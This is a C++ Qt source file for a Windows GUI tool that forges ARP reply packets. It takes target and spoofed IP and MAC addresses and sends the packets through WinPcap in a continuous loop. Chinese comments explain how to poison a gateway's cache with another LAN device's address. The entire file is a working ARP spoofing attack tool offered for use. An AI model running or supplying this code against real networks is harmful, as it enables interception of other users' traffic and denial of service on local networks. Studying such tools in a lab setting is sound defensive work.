#include <QRegExpValidator>
#include <thread>
#include "arpspoof.h"
#include "ui_arpspoof.h"
#include "capthread.h"
#include <windows.h>

#include <QDebug>

ArpSpoof::ArpSpoof(QWidget *parent, QString nicName) :
    QWidget(parent),
    ui(new Ui::ArpSpoof)
{
    ui->setupUi(this);
    this->nicName = nicName;
    ui->nicName->setText(nicName);

    /* 关闭时销毁 */
    this->setAttribute(Qt::WA_DeleteOnClose, true);

    /* 设置可用性 */
    if(nicName == ""){
        ui->startBtn->setEnabled(false);
        ui->stopBtn->setEnabled(false);
    }
    ui->stopBtn->setEnabled(false);

    /* 设置正则表达式，限制输入格式 */
    QRegExp ipRx("^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$");
    QRegExpValidator* IPValidator = new QRegExpValidator(ipRx);
    ui->targetIP->setValidator(IPValidator);
    ui->spoofIP->setValidator(IPValidator);
    QRegExp macRx("([0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2}-[0-9A-F]{2})");
    QRegExpValidator* macValidator = new QRegExpValidator(macRx);
    ui->targetMacAddr->setValidator(macValidator);
    ui->spoofMacAddr->setValidator(macValidator);

    /* 开始ARP欺骗 */
    connect(ui->startBtn, &QPushButton::clicked, [=](){
        /* 判断输入内容 */
        if(ui->targetIP->text().size() < 7 || ui->targetMacAddr->text().size() < 17
                || ui->spoofIP->text().size() < 7 || ui->spoofMacAddr->text().size() < 17){
            ui->ArpResult->append("Wrong input! Check again!");
        }else{
            ui->startBtn->setEnabled(false);
            ui->stopBtn->setEnabled(true);
            keepSend = true;
            std::thread t(&ArpSpoof::arpSpoofing, this, ui->targetIP->text(),
                          ui->targetMacAddr->text(), ui->spoofIP->text(),
                          ui->spoofMacAddr->text());
            t.detach();
        }
    });

    /* 停止ARP欺骗 */
    connect(ui->stopBtn, &QPushButton::clicked, [=](){
        ui->startBtn->setEnabled(true);
        ui->stopBtn->setEnabled(false);
        keepSend = false;
    });

    /* Textedit添加文本 */
    connect(this, &ArpSpoof::sendText, this, &ArpSpoof::addText);
}

ArpSpoof::~ArpSpoof()
{
    delete ui;
}

void ArpSpoof::addText(QString text)
{
    ui->ArpResult->append(text);
}


void ArpSpoof::arpSpoofing(QString targetIP, QString targetMAC,
                           QString spoofIP, QString spoofMAC)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char packet[42];
    /* spoof 指要欺骗的内容， target指欺骗的对象
     * 比如，将目标设置为网关，欺骗内容的IP设置为同一LAN中的另一个设备IP，
     * 欺骗MAC则为随机MAC
     */
    QStringList targetIPlist = targetIP.split(".");
    QStringList spoofIPlist = spoofIP.split(".");
    QStringList targetMAClist = targetMAC.split("-");
    QStringList spoofMAClist = spoofMAC.split("-");

    /* 设置以太网帧 */
    eth_header eth;
    for(int i = 0;i<6;i++){
        eth.src[i] = static_cast<uchar>(spoofMAClist[i].toInt(nullptr, 16));
        eth.dest[i] = static_cast<uchar>(targetMAClist[i].toInt(nullptr, 16));
    }
    eth.type = htons(0x0806);
    memcpy(packet, &eth, sizeof (eth));

    /* 设置ARP头部 */
    arp_header arp;
    arp.ar_hw = htons(1);
    arp.ar_prot = htons(0x0800);
    arp.ar_hln = 6;
    arp.ar_pln = 4;
    arp.ar_op = htons(2);
    memcpy(arp.ar_srcmac, eth.src, 6);
    memcpy(arp.ar_destmac, eth.dest, 6);
    for(int i = 0;i<4;i++){
        arp.ar_srcip[i] = static_cast<uchar>(spoofIPlist[i].toInt());
        arp.ar_destip[i] = static_cast<uchar>(targetIPlist[i].toInt());
    }
    memcpy(&packet[14], &arp, sizeof (arp));



    /* 打开网卡 */
    if ((fp= pcap_open(nicName.toLocal8Bit().data(),          // 设备名
                       65536,            // 65535保证能捕获到不同数据链路层上的每个数据包的全部内容
                       PCAP_OPENFLAG_PROMISCUOUS,    // 混杂模式
                       1000,             // 读取超时时间
                       nullptr,             // 远程机器验证
                       errbuf            // 错误缓冲池
                       )) == nullptr)
    {
        emit sendText("Error when open the adapter.");
    }


    /* 发送数据包 */
    int count = 200;
    while(keepSend){
        if (pcap_sendpacket(fp, packet, 42 /* size */) != 0)
        {
            emit sendText("Error sending the ARP packet.");
        }
        if(count ==0){
            emit sendText(" - 200 ARP packets sent.");
            count = 200;
        }
        count --;
        Sleep(10);
    }
    pcap_close(fp);
}

void ArpSpoof::closeEvent(QCloseEvent *event)
{
    emit beClosed();
}
